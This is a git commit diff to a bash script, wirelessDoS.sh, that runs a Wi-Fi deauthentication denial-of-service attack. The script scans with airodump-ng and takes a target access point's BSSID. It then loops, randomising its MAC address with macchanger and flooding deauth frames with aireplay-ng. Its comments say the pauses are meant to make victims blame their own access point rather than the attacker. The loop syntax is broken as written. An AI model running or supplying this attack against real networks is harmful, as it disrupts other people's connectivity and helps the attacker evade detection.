0492b2cc93a0a221f78e1e792599fd83a0ecf065
Luciano Kumaru <shinjox27@outlook.com>
2023-11-07 09:58:48 -0500

    Update wirelessDoS.sh
    Added a root check removed Sudo

--- wirelessDoS.sh
+++ wirelessDoS.sh
@@ -6,17 +6,26 @@
 # Some APs will not allow this, and you will have to rerun this script with the individual MAC addresses you want to de-authenticate.
 
 # Closes any process that could cause trouble once the wireless adapter is in monitor mode
-sudo airmon-ng check kill
+
+# Checks to see if the script is run as root
+if [[ "${UID}" -ne 0 ]]; then
+    echo 'Please run with sudo or as root.' >&2
+    exit 1
+fi
+
+# make's sure no programs will interefere with the script
+airmon-ng check kill
 
 # identify the enemy's BSSID and copy it!
 
-sudo airodump-ng wlan0mon
+airodump-ng wlan0mon
 
 # set the BSSID you wish to target
 
 echo "Enter the BSSID you wish to target. :"
 
 # sets the BSSID as a variable
+
 read BSSID
 
 # set the number of times you wish to run the loop
@@ -44,19 +53,24 @@ echo "How many seconds do you want to wait in between each strike :"
 read SLEEP
 
 # Creates a for loop that will execute our commands how many times the user specified.
+
 for i {1..$LOOP}
 
 # Contains the commands we want to execute. Everything after the do and before the done will be executed in each loop
+
 do
 
 # Changes the MacAddress between executions 
-	sudo macchanger -r wlan0
+
+	macchanger -r wlan0
  
 # Sends the deauth frames 100 times (the default is continuous) to the MAC address of the AP (-a) from the interface wlan0mon.
-	sudo aireplay-ng --deauth $DEAUTH -a $BSSID wlan0mon
+
+	aireplay-ng --deauth $DEAUTH -a $BSSID wlan0mon
  
 # Tells the script to sleep for 60 seconds. In this way, the clients will be able to re-authenticate for 60 seconds before you send another deauth flood. 
 # Hopefully, this short interval will lead them to believe that the problem is with their AP and not you.
+
 	sleep $SLEEP
  
 # closes the for loop.	
